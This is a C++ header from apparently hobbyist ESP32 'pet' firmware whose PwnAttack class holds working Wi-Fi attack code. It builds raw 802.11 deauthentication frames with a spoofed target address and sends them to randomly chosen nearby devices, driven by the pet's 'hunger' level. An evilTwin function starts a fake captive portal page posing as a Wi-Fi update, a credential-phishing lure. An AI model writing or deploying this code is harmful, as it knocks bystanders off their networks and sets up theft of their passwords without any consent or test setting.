#ifndef PWN_ATTACK_H
#define PWN_ATTACK_H

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "core/PwnPet.h"
#include "core/PwnPower.h"
#include "core/Gamification.h"
#include "WiFiTools.h"
#include "../EvilPortal.h" // Integration

// Deauth Frame Structure
const uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x3A, 0x01, // Frame Control, Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter (Target AP - to be filled)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Target AP - to be filled)
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason code (7 = Class 3 frame received from nonassociated STA)
};

struct AttackStats {
    int aps_scanned;
    int clients_seen;
    int handshakes_captured;
    bool is_walking;
};

class PwnAttack {
private:
    static AttackStats stats;
    static bool scan_active;
    static unsigned long last_scan_time;

    static void macStringToBytes(String mac, uint8_t* bytes) {
        int values[6];
        if (6 == sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x",
            &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
            for (int i = 0; i < 6; ++i) bytes[i] = (uint8_t)values[i];
        }
    }

public:
    static void init() {
        stats.aps_scanned = 0;
        stats.handshakes_captured = 0;
        last_scan_time = millis();
        if (PwnPet::getStats().energy_mode > 0) {
            WiFiTools::startSniffer();
        }
    }

    static void start() {
        scan_active = true;
        WiFiTools::startSniffer();
        Serial.println("[Attack] Modo Ataque Iniciado!");
    }

    static bool isRunning() { return scan_active; }

    static void tick() {
        // Se Evil Portal estiver rodando, não faz scan/deauth
        if (EvilPortal::isRunning()) {
            EvilPortal::loop();
            return;
        }

        if (PwnPower::isCritical()) {
            if (scan_active) {
                esp_wifi_stop();
                scan_active = false;
                Serial.println("[Attack] Parado por bateria critica");
            }
            return;
        }

        int energy = PwnPet::getStats().energy_mode;
        int interval = (energy == 2) ? 100 : (energy == 1 ? 500 : 2000);

        static unsigned long last_tick = 0;
        if (millis() - last_tick < interval) return;
        last_tick = millis();

        // Otimização 3: Duty Cycle do Marauder
        if (PwnPet::getHunger() > 80 && scan_active) {
             static unsigned long last_attack = 0;
             if (millis() - last_attack > 5000) {
                 last_attack = millis();

                 if (WiFiTools::nearby_devices.size() > 0) {
                     int idx = random(0, WiFiTools::nearby_devices.size());
                     String targetMacStr = WiFiTools::nearby_devices[idx].mac;

                     uint8_t targetBytes[6];
                     macStringToBytes(targetMacStr, targetBytes);

                     deauthTarget(targetBytes);
                 }
             }
        }
    }

    static void deauthTarget(uint8_t* bssid) {
        uint8_t packet[26];
        memcpy(packet, deauthPacket, 26);
        memcpy(&packet[10], bssid, 6);
        memcpy(&packet[16], bssid, 6);

        Serial.printf("[Attack] Enviando Deauth para %02X:%02X:%02X:%02X:%02X:%02X\n",
            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

        for (int i = 0; i < 3; i++) {
             esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), true);
             delay(10);
        }

        // Simulação de sucesso para gameplay
        if (random(0, 100) < 10) {
            // PwnPet::addHandshake(false);
        }
    }

    static void evilTwin(String ssid) {
        // Inicia Evil Portal
        EvilPortal::start(ssid.c_str(), "/evil_portal/01_wifi_update.html");
    }
};

AttackStats PwnAttack::stats;
bool PwnAttack::scan_active = true;
unsigned long PwnAttack::last_scan_time = 0;

#endif
